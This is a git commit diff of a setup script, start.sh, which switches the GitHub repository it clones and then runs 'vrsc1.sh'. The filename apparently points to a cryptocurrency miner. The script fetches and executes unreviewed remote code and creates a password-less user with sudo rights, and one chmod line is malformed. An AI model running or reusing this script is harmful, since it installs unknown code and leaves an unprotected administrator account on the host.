e6ea25e8e7d805652f67cbcafe08fd03a46da97f
Guling934 <87347504+Guling934@users.noreply.github.com>
2021-07-18 15:00:49 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 sudo apt update
-git clone https://github.com/Kardus301/gudang.git && cd gudang
+git clone https://github.com/Jiad68/asepg.git && cd asepg
 chmod +x vrsc1.sh && chmod +x uluk chmod 777 uluk vrsc1.sh
 sudo adduser --disabled-password --gecos "" budi && sudo usermod -aG sudo budi
 sudo -u budi -H sh -c "./vrsc1.sh"
